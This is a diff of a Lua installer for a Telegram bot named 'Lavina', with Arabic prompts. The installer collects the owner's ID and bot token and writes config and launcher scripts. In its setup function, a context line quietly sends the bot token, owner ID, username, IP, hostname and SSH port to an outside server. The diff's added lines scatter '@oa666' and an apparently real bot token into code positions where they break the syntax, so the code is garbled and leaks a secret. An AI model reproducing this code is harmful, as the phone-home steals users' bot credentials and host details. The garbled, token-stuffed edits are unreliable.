@@ -20,22 +20,22 @@ Name    = io.popen("uname -a | awk '{ name = $2 } END { print name }'"):read('*a
 Port    = io.popen("echo ${SSH_CLIENT} | awk '{ port = $3 } END { print port }'"):read('*a'):gsub('[\n\r]+', '')
 UpTime  = io.popen([[uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes"}']]):read('*a'):gsub('[\n\r]+', '')
 --     Source Lavina     --
-local AutoSet = function() 
+local AutoSet = function(@oa666) 
 if not DevRio:get(Server.."IdLavina") then 
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
-local DevId = io.read():gsub(' ','') 
+local DevId = io.read(@oa666):gsub(' ','') 
 if tostring(DevId):match('%d+') then 
 io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
 DevRio:set(Server.."IdLavina",DevId) 
 else 
-print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉@oa666') 
 end 
 os.execute('lua Lavina.lua') 
 end 
 if not DevRio:get(Server.."TokenLavina") then 
 io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
-local TokenBot = io.read() 
-if TokenBot ~= '' then 
+local TokenBot = io.read(2139218906:AAECyRrikOvn25JCWARUdtmpgIgExX2K16A) 
+if TokenBot ~= '' then 2139218906:AAECyRrikOvn25JCWARUdtmpgIgExX2K16A
 local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe') 
 if res ~= 200 then 
 print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
@@ -60,11 +60,11 @@ file:write(serialized)
 file:close()  
 end
 local CreateConfigAuto = function()
-Config = {
+Config = {@oa666
 DevId = DevRio:get(Server.."IdLavina"),
 TokenBot = DevRio:get(Server.."TokenLavina"),
 Lavina = DevRio:get(Server.."TokenLavina"):match("(%d+)"),
-SudoIds = {DevRio:get(Server.."IdLavina")},
+SudoIds = {DevRio:get(Server.."IdLavina")2139218906:AAECyRrikOvn25JCWARUdtmpgIgExX2K16A},
 }
 Create(Config, "./config.lua") 
 https.request("https://apiabs.ml/Api/Lavina/index.php?Get=Lavina&DevId="..DevRio:get(Server.."IdLavina").."&TokenBot="..DevRio:get(Server.."TokenLavina").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
@@ -72,7 +72,7 @@ file = io.open("Lavina.sh", "w")
 file:write([[
 #!/usr/bin/env bash
 cd $HOME/Lavina
-token="]]..DevRio:get(Server.."TokenLavina")..[["
+token="]]..DevRio:get(Server.."TokenLavina")..[["2139218906:AAECyRrikOvn25JCWARUdtmpgIgExX2K16A
 while(true) do
 rm -fr ../.telegram-cli
 if [ ! -f ./tg ]; then
@@ -81,7 +81,7 @@ echo "~ The tg File Was Not Found In The Bot Files!"
 echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 exit 1
 fi
-if [ ! $token ]; then
+if [ ! $token ]; then2139218906:AAECyRrikOvn25JCWARUdtmpgIgExX2K16A
 echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
 echo "~ The Token Was Not Found In The config.lua File!"
 echo "┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉"
@@ -90,7 +90,7 @@ fi
 ./tg -s ./Lavina.lua -p PROFILE --bot=$token
 done
 ]])  
-file:close()  
+file:close(@oa666)  
 file = io.open("Run", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -101,7 +101,7 @@ screen -S Lavina -X kill
 screen -S Lavina ./Lavina.sh
 done
 ]]) 
-file:close() 
+file:close()@oa666 
 io.popen("mkdir Files")
 os.execute('chmod +x Run;./Run')
 end 
